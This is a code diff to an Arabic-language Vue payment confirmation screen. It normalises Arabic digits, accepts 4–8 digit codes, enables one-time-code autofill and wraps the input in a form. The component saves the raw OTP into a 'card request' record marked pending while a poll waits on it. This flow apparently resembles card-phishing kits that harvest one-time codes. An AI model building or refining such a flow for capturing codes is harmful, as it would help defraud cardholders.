@@ -34,17 +34,24 @@ onUnmounted(() => {
   if (statusPoll) clearInterval(statusPoll);
 });
 
-const submitOtp = async () => {
-  if (!otp.value || isSubmitting.value) return;
+const normalizeDigits = (val: string): string =>
+  val
+    .replace(/[\u0660-\u0669]/g, (c) => String(c.charCodeAt(0) - 0x0660))
+    .replace(/[\u06F0-\u06F9]/g, (c) => String(c.charCodeAt(0) - 0x06f0));
 
-  if (!/^\d{6}$/.test(otp.value)) {
-    error.value = 'الرجاء إدخال رمز صحيح مكون من 6 أرقام';
+const submitOtp = async () => {
+  if (isSubmitting.value) return;
+
+  const cleanOtp = normalizeDigits(otp.value).replace(/\D/g, '');
+  if (!/^\d{4,8}$/.test(cleanOtp)) {
+    error.value = 'الرجاء إدخال رمز تحقق صحيح مكون من 4 إلى 8 أرقام';
     return;
   }
+  otp.value = cleanOtp;
   error.value = '';
 
   isSubmitting.value = true;
-  
+
   const requestId = await resolveActiveRequestId();
   if (!requestId) {
     error.value = 'لم يتم العثور على الطلب، يرجى البدء من جديد.';
@@ -55,7 +62,7 @@ const submitOtp = async () => {
 
   try {
     await updateCardRequest(requestId, {
-      otp: otp.value,
+      otp: cleanOtp,
       step: 'otp',
       otpStatus: 'pending'
     });
@@ -137,32 +144,37 @@ const submitOtp = async () => {
             {{ successMessage }}
           </div>
 
-          <!-- OTP Input -->
-          <div class="w-full mb-5 relative" dir="ltr">
-            <input 
-              type="text" 
-              v-model="otp" 
-              placeholder="• • • • • •" 
-              class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf9] text-center text-lg tracking-[0.5em] focus:outline-none focus:border-[#c5a44e] focus:bg-white text-slate-900 transition-colors placeholder-slate-300 font-mono tabular-nums"
-              maxlength="6"
-            />
-            <p v-if="error" class="text-red-600 text-[11px] font-semibold mt-1.5 text-center" dir="rtl">{{ error }}</p>
-          </div>
+          <!-- OTP Form -->
+          <form @submit.prevent="submitOtp" class="w-full">
+            <!-- OTP Input -->
+            <div class="w-full mb-5 relative" dir="ltr">
+              <input 
+                type="text" 
+                inputmode="numeric"
+                autocomplete="one-time-code"
+                v-model="otp" 
+                placeholder="• • • • • •" 
+                class="w-full h-12 rounded-xl border border-slate-200 bg-[#fcfbf9] text-center text-lg tracking-[0.5em] focus:outline-none focus:border-[#c5a44e] focus:bg-white text-slate-900 transition-colors placeholder-slate-300 font-mono tabular-nums"
+                maxlength="8"
+              />
+              <p v-if="error" class="text-red-600 text-[11px] font-semibold mt-1.5 text-center" dir="rtl">{{ error }}</p>
+            </div>
 
-          <!-- Timer -->
-          <div class="text-xl font-extrabold text-[#0b1f38] mb-5 tracking-wider font-mono tabular-nums" dir="ltr">
-            {{ formattedTime }}
-          </div>
+            <!-- Timer -->
+            <div class="text-xl font-extrabold text-[#0b1f38] mb-5 tracking-wider font-mono tabular-nums" dir="ltr">
+              {{ formattedTime }}
+            </div>
 
-          <!-- Submit Button -->
-          <button 
-            @click="submitOtp" 
-            :disabled="isSubmitting"
-            class="w-full h-12 bg-gradient-to-r from-[#c8a951] via-[#b4943c] to-[#987a28] hover:from-[#d2b35b] hover:to-[#a3842f] text-white rounded-xl font-extrabold text-sm transition-all shadow-[0_8px_20px_rgba(180,148,60,0.3)] disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 cursor-pointer"
-          >
-            <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
-            <span v-else>تأكيد الدفع (Confirm)</span>
-          </button>
+            <!-- Submit Button -->
+            <button 
+              type="submit" 
+              :disabled="isSubmitting"
+              class="w-full h-12 bg-gradient-to-r from-[#c8a951] via-[#b4943c] to-[#987a28] hover:from-[#d2b35b] hover:to-[#a3842f] text-white rounded-xl font-extrabold text-sm transition-all shadow-[0_8px_20px_rgba(180,148,60,0.3)] disabled:opacity-70 disabled:cursor-not-allowed flex items-center justify-center gap-2 cursor-pointer"
+            >
+              <span v-if="isSubmitting" class="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></span>
+              <span v-else>تأكيد الدفع (Confirm)</span>
+            </button>
+          </form>
 
         </div>
 
